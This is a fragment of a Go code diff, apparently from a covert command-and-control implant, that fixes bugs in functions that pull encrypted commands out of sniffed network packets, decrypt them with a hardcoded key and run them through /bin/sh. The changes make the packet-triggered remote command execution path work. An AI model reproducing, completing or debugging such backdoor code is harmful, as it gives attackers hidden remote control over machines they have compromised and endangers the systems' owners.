@@ -361,7 +361,7 @@ func CreateTargetCommand(cmd string, ip string) (command string) {
 }
 // ======
 
-func decryptCommand(ciphertext string) {
+func decryptCommand(ciphertext string) string {
 		// Decrypt Packet
 		key := []byte("pooppooppooppoop")
 		tmp := []byte(ciphertext)
@@ -378,19 +378,19 @@ func decryptCommand(ciphertext string) {
 
 func execCommand(command string) {
 	// Only run command if we didn't just run it
-	if lastCmdRan != ciphertext {
+	if lastCmdRan != command {
 		// fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
-		_, err2 := exec.Command("/bin/sh", "-c", command).CombinedOutput()
-		if err2 != nil {
+		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
+		if err != nil {
 			if debugCheck != "" { fmt.Println("\n[-] ERROR:", err) }
 		}
 		// Save last command we just ran
 		lastCmdRan = command
 		// fmt.Println("[+] OUTPUT:", string(out))
 	} else {
-		// fmt.Println("[!] Already ran command", command)
+		if debugCheck != "" { fmt.Println("[!] Already ran command", command) }
 	}
 
 }
@@ -514,8 +514,9 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 
 	//Parse commands to run
 	if len(payload) > 3 {
-		cmd := payload[4]
-		execCommand(decryptCommand(cmd))
+		tmp := payload[4]
+		cmd := decryptCommand(tmp)
+		execCommand(cmd)
 	}
 
 	//get ping command
